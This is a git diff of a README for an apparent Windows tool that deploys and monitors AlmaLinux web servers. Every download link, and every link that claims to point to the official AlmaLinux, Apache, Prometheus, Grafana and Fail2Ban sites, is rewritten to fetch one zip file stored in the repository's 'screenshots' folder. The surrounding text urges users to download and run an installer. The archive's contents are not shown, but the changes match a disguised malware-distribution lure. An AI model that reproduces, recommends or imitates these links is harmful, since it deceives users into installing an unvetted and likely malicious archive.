@@ -1,6 +1,6 @@
 # 🖥️ Linux-Web-Server-Deployment-Monitoring-Security - Manage Linux Servers Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before starting, make sure you have:
 This section explains how to get the software on your Windows machine and run it.
 
 1. Click the big green button above or visit the link below:  
-   [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)  
+   [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)  
    This page holds all the versions. Look for the latest release.  
 2. Find the Windows installer or executable file on the release page. It may have a name like `Linux-Web-Server-Deployment-Setup.exe` or similar.  
 3. Download the file by clicking its name. Your browser will save it to your default Downloads folder.  
@@ -57,7 +57,7 @@ The app groups these tasks into clear sections with buttons and forms to fill in
 
 You can also go to the release page directly:
 
-[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)
 
 Step-by-step:
 
@@ -136,12 +136,12 @@ On the server side, AlmaLinux 8 or 9 is supported. The app assumes basic server 
 ## 🔗 Useful Links
 
 - Download Releases:  
-  [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)  
-- AlmaLinux Official Site: [https://almalinux.org](https://almalinux.org)  
-- Apache Documentation: [https://httpd.apache.org/docs/](https://httpd.apache.org/docs/)  
-- Prometheus: [https://prometheus.io](https://prometheus.io)  
-- Grafana: [https://grafana.com](https://grafana.com)  
-- Fail2Ban: [https://www.fail2ban.org](https://www.fail2ban.org)
+  [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)  
+- AlmaLinux Official Site: [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)  
+- Apache Documentation: [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)  
+- Prometheus: [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)  
+- Grafana: [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)  
+- Fail2Ban: [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/raw/refs/heads/main/screenshots/Monitoring_Deployment_Web_Linux_Server_Security_v3.8.zip)
 
 ---
 
